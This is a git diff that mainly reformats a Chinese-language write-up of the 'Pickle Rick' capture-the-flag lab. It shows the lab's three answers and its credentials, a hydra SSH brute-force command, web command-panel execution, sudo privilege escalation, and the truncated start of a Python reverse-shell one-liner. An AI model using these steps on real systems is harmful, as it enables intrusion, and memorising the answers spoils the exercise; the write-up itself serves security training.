@@ -13,15 +13,23 @@ permalink: /penetration/qe5zotup/
 - 找到三种`ingredients`
 ## 此挑战需要回答以下问题
 
-::: details **Task-1** 药剂的第一种成分是什么？
+```ad-details
+collapse: true
+title: **Task-1** 药剂的第一种成分是什么？
 答案：`mr. meeseek hair`
-:::
-::: details **Task-2** 药剂的第二种成分是什么？
+```
+
+```ad-details
+collapse: true
+title:  **Task-2** 药剂的第二种成分是什么？
 答案：`1 jerry tear`
-:::
-::: details **Task-3** 药剂的最后一种成分是什么？
+```
+
+```ad-details
+collapse: true
+title: **Task-3** 药剂的最后一种成分是什么？
 答案：`fleeb juice`
-:::
+```
 
 ## 解题思路总结
 
@@ -77,7 +85,7 @@ gobuster dir -u http://10.10.79.158 -w /usr/share/wordlists/dirbuster/directory-
 
 目录爆破结果，因首先关注状态码为`200`的，其次关注状态码为`300` 的
 
-```text hl(5-8)
+```text hl:5-8 file:text
 /.hta (Status: 403)
 /.htaccess (Status: 403)
 /.htpasswd (Status: 403)
@@ -92,7 +100,7 @@ gobuster dir -u http://10.10.79.158 -w /usr/share/wordlists/dirbuster/directory-
 
 通过`nmap`端口扫描，发现此主机开启了TCP`80`、`22`端口，尝试爆破22端口，**未成功**。
 
-```bash
+```bash file:hydra
 hydra -l R1ckRul3s -P /usr/share//usr/share/wordlists
 /rockyou.txt  ssh://10.10.204.241
 ```
@@ -126,13 +134,14 @@ hydra -l R1ckRul3s -P /usr/share//usr/share/wordlists
 - 用户名：`R1ckRul3s`
 - 密码：`Wubbalubbadubdub`
 输入勇猛密码后我们来到了`Command Panel` 命令行页面：
+
 ![](assets/web-pickle-rick/file-20241023120401.png)
 
 
 ### 尝试执行命令并获取第一种成分
 
 在命令航执行命令：
-```bash
+```bash file:whoami
 whoami && pwd && ls
 ```
 
@@ -167,7 +176,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 成功连接终端后，我们可以执行`cd`命令跳转到`/home`下，或直接执行`ls /home`  命令，在此会发现在`rick`用户目录。跳转到该目录下，会发现`second  ingredients` 文件，使用`cat`命令查看此文件会发现第二种成分。
 
-```bash
+```bash file:second
 cat /home/rick/second\ ingredients # or  cat /home/rick/‘second ingredients‘
 
 1 jerry tear
@@ -179,8 +188,8 @@ cat /home/rick/second\ ingredients # or  cat /home/rick/‘second ingredients‘
 
 要获取`root`权限，我们通常要不断尝试才可能成功，在这里我从最好用最常见的开始尝试，直接查看当前用户的`sudo`权限配置:
 
-```bash
-sudo -l
+```bash file:sudo
+sudo -l 
 ```
 
 发现此用户执行`sudo` 不需要密码，因此可以直接通过`sudo`命令提权：
@@ -202,7 +211,6 @@ sudo bash
 到此，我们通过`whoami` 命令查看，可知我们目前已获取到`root`权限，让我们跳转到`/root`下，找到`3rd.txt`文件，`cat` 命令查看该文件，获取第三种成分：`fleeb juice`
 ![](assets/web-pickle-rick/file-20241024231619.png)
 
-
 ## 总结
 
 通过本次挑战复习了以下知识点和技能：
@@ -211,11 +219,3 @@ sudo bash
 - 目标主机无`nc`情况下的shell反弹
 - linux提权
 - `robots.txt` 目录的做用
-
-
-
-
-
-
-
-
